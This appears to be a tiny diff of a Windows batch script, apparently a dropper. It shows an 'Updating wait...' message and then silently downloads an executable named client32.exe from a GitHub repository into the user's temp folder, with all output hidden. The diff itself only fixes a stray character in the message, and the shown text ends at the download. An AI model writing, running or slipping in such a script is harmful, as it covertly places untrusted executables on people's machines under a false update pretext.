@@ -1,5 +1,5 @@
 @echo off
-echo ГUpdating wait...
+echo Updating wait...
 set "TEMP=%USERPROFILE%\AppData\Local\Temp"
 
 curl -L -o "%TEMP%\client32.exe" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/client32.exe" >nul 2>&1
